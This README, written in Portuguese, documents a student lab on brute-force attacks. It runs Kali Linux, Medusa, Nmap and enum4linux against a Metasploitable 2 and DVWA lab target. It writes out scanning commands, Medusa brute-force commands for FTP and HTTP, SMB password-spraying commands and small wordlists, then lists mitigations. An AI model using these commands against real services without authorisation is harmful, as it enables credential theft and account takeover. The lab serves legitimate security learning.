Laboratório de Brute Force com Kali Linux e Medusa
Descrição

Este projeto foi desenvolvido como parte do desafio da DIO sobre ataques de força bruta utilizando Kali Linux e a ferramenta Medusa.

O objetivo do laboratório foi compreender como funcionam ataques de autenticação em diferentes serviços e aplicações, utilizando um ambiente controlado e vulnerável para fins educacionais.

Durante os testes foram realizados:

Ataque de força bruta em FTP;
Simulação de autenticação em aplicação web com DVWA;
Password Spraying em SMB;
Enumeração de usuários;
Validação de credenciais;
Documentação de mitigação e boas práticas.

⚠️ Todos os testes foram executados exclusivamente em ambiente virtual controlado, com finalidade educacional.

Objetivos do Projeto
Compreender ataques de força bruta;
Utilizar Kali Linux para auditoria de segurança;
Aprender comandos básicos do Medusa;
Realizar enumeração de serviços;
Documentar processos técnicos;
Demonstrar conhecimentos básicos em Cyber Security.
Tecnologias Utilizadas
Sistemas Operacionais
Kali Linux
Metasploitable 2
Ferramentas
Medusa
Nmap
Enum4Linux
DVWA
VirtualBox
Estrutura do Laboratório
Máquina Atacante
Sistema	Função
Kali Linux	Execução dos testes de segurança
Máquina Vulnerável
Sistema	Função
Metasploitable 2	Ambiente vulnerável para testes
Configuração do Ambiente
VirtualBox

As duas máquinas virtuais foram configuradas utilizando:

Host-Only Adapter

Isso permitiu comunicação interna entre as VMs sem acesso externo.

Descobrindo o endereço IP

No Metasploitable 2:

ifconfig

IP identificado:

192.168.56.101
Reconhecimento Inicial

Foi utilizado o Nmap para identificar portas e serviços ativos.

Comando
nmap -sV 192.168.56.101
Serviços encontrados
FTP
SSH
Telnet
SMB
HTTP
MySQL
Ataque 1 — Brute Force em FTP
Objetivo

Realizar ataque de força bruta contra o serviço FTP utilizando Medusa.

Wordlists utilizadas
users.txt
msfadmin
admin
user
root
senhas.txt
123456
password
admin
msfadmin
root
Comando Medusa
medusa -h 192.168.56.101 -U users.txt -P senhas.txt -M ftp
Resultado

O Medusa identificou uma credencial válida:

ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin
Validação do acesso

Foi realizado login manual no FTP.

Comando
ftp 192.168.56.101
Credenciais
Usuário: msfadmin
Senha: msfadmin
Ataque 2 — DVWA (Damn Vulnerable Web Application)
Objetivo

Simular autenticação vulnerável em aplicação web.

Acesso ao DVWA

No navegador do Kali Linux:

http://192.168.56.101/dvwa
Login padrão
Usuário: admin
Senha: password
Configuração

No painel do DVWA:

DVWA Security → LOW
Teste com Medusa
medusa -h 192.168.56.101 -u admin -P senhas.txt -M http
Objetivo do teste

Demonstrar como aplicações sem proteção contra múltiplas tentativas podem ser vulneráveis a ataques automatizados.

Ataque 3 — Password Spraying em SMB
Objetivo

Realizar password spraying utilizando múltiplos usuários e uma senha comum.

Enumeração de usuários
Comando
enum4linux 192.168.56.101
Password Spraying
Comando
medusa -h 192.168.56.101 -U users.txt -p password -M smbnt
Conceitos Aprendidos
Brute Force

Ataque que testa diversas combinações de senha automaticamente até encontrar uma credencial válida.

Password Spraying

Técnica que utiliza uma senha comum contra vários usuários diferentes, reduzindo risco de bloqueios automáticos.

Enumeração

Processo de coleta de informações sobre serviços, usuários e recursos disponíveis em um sistema.

Mitigações e Boas Práticas
Recomendações
Utilizar senhas fortes;
Implementar autenticação multifator (MFA);
Limitar tentativas de login;
Monitorar logs de autenticação;
Utilizar CAPTCHA em aplicações web;
Restringir acesso por IP;
Desativar serviços desnecessários;
Utilizar políticas de senha;
Atualizar sistemas regularmente.
Estrutura do Repositório
medusa-bruteforce-lab/
│
├── README.md
├── wordlists/
│   ├── users.txt
│   └── senhas.txt
│
├── images/
│   ├── kali.png
│   ├── ftp.png
│   ├── dvwa.png
│   └── smb.png
│
└── scripts/
    └── comandos.txt
Observação

Por se tratar de um laboratório educacional focado em documentação técnica e aprendizado dos conceitos, o projeto foi desenvolvido sem capturas de tela, priorizando a descrição detalhada dos comandos, processos e resultados obtidos.

Comandos Utilizados
Instalação do Medusa
sudo apt install medusa
Instalação do Enum4Linux
sudo apt install enum4linux
Scan Nmap
nmap -sV 192.168.56.101
FTP Brute Force
medusa -h 192.168.56.101 -U users.txt -P senhas.txt -M ftp
SMB Password Spraying
medusa -h 192.168.56.101 -U users.txt -p password -M smbnt
Conclusão

Este laboratório permitiu compreender na prática como ataques de autenticação funcionam em diferentes protocolos e aplicações.

Além disso, foi possível entender a importância da utilização de boas práticas de segurança para proteção contra ataques automatizados.

O projeto também contribuiu para o aprendizado sobre:

Kali Linux;
Enumeração de serviços;
Utilização do Medusa;
Documentação técnica;
Segurança ofensiva em ambiente controlado.
Referências
Kali Linux

https://www.kali.org/

DVWA

https://github.com/digininja/DVWA

Medusa

https://github.com/jmk-foofus/medusa

Nmap

https://nmap.org/

Autor

Luigi Fratoni

Projeto desenvolvido para fins educacionais durante o desafio da DIO, com foco em aprendizado prático de Kali Linux, Medusa, brute force, enumeração de serviços e segurança ofensiva em ambiente controlado.
